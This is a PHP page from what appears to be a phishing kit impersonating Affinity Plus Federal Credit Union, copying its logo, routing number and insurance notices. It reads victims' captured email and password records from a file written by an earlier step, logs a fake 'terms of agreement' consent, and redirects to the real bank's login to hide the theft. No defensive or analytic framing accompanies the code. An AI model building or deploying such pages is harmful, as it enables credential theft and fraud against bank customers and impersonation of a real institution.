<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $isChecked = isset($_POST['agree']);
    
    // Validation
    if (!$isChecked) {
        $errors['agree'] = 'Please agree to the terms before continuing.';
    }
    
    if (empty($errors)) {
        // Get user email from previous step for completion message
        $userData = getUserData('email_password.txt', $username);
        $userEmail = 'N/A';
        if (!empty($userData)) {
            $userEmail = $userData[0]['usr_eml'] ?? 'N/A';
        }
        
        // Save to test file
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'terms_accepted' => $isChecked,
            'usr_eml' => $userEmail,
            'completed_at' => date('Y-m-d H:i:s')
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final URL
        header('Location: https://affinityplus.org/login');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terms of agreement - Affinity Plus</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative" style="background-image: url('assets/background.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex flex-col min-h-screen">
            <!-- Header -->
            <header class="bg-purple-900 text-white py-3 px-6 flex items-center justify-between shadow-md">
                <div class="flex items-center space-x-2">
                    <img src="assets/logo.svg" alt="Affinity Plus Logo" class="h-10 w-auto" />
                </div>
                <div class="flex items-center space-x-3">
                    <div class="text-white/80 hover:text-white cursor-pointer transition-colors p-1">
                        <i class="fas fa-comments text-xl"></i>
                    </div>
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-10">
                <!-- Terms Card -->
                <div class="bg-white shadow-lg rounded-md w-full max-w-md p-6 flex flex-col gap-4">
                    <!-- Card Header -->
                    <div>
                        <h2 class="text-center text-xl font-semibold mb-2 text-gray-900">Terms of agreement</h2>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        <?php echo htmlspecialchars($errors['agree']); ?>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                        <p class="text-sm text-gray-600">
                            By submitting this registration form, you authorize Affinity and its affiliates to request and receive information
                            about you from third parties, including copies of your consumer credit report and motor vehicle records, at any time while
                            your account remains active.
                        </p>
                        <p class="text-sm text-gray-600">
                            You also authorize us to retain a copy of this information for use in accordance with our 
                            <a href="#" class="text-purple-800 hover:underline">Terms of Service</a> and 
                            <a href="#" class="text-purple-800 hover:underline">Privacy Statement</a>.
                        </p>

                        <label class="flex items-center gap-2 text-sm text-gray-700">
                            <input
                                type="checkbox"
                                name="agree"
                                <?php echo (isset($_POST['agree'])) ? 'checked' : ''; ?>
                                class="h-4 w-4 text-purple-700 focus:ring-purple-600 border-gray-300 rounded"
                            >
                            I understand and agree
                        </label>

                        <!-- Submit Button -->
                        <button
                            type="submit"
                            class="w-full bg-purple-900 hover:bg-purple-800 text-white py-3 rounded-md font-medium transition disabled:opacity-70"
                        >
                            Finish
                        </button>
                    </form>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-white py-6 text-center text-sm text-gray-700 border-t border-gray-200">
                <div class="flex flex-col md:flex-row items-center justify-center gap-3 mb-3">
                    <a href="#" class="text-purple-800 hover:underline">Contact Us</a>
                    <a href="#" class="text-purple-800 hover:underline">Locations</a>
                    <a href="#" class="text-purple-800 hover:underline">Disclosures</a>
                    <a href="#" class="text-purple-800 hover:underline">Privacy Policy</a>
                    <a href="#" class="text-purple-800 hover:underline">Open a Membership</a>
                </div>
                <p class="text-xs text-gray-600">Routing # 296076301</p>
                <p class="text-xs mt-2 text-gray-600">
                    Affinity Plus Federal Credit Union is federally insured by the National Credit Union Administration. Copyright 2025 Affinity Plus Federal Credit Union.
                </p>

                <div class="flex items-center justify-center gap-4 mt-4">
                    <img src="assets/equal-housing.png" alt="Equal Housing Lender" class="h-8 w-auto" />
                    <img src="assets/ncua.png" alt="NCUA Insured" class="h-8 w-auto" />
                </div>
            </footer>
        </div>
    </div>
    
    <script>
        // Auto-focus checkbox on page load
        document.addEventListener('DOMContentLoaded', function() {
            const checkbox = document.querySelector('input[type="checkbox"]');
            if (checkbox && !checkbox.checked) {
                checkbox.focus();
            }
        });
        
        // Clear error when checkbox is ticked
        document.querySelector('input[type="checkbox"]').addEventListener('change', function() {
            const errorDiv = document.querySelector('.bg-red-50');
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
        });
    </script>
</body>
</html>
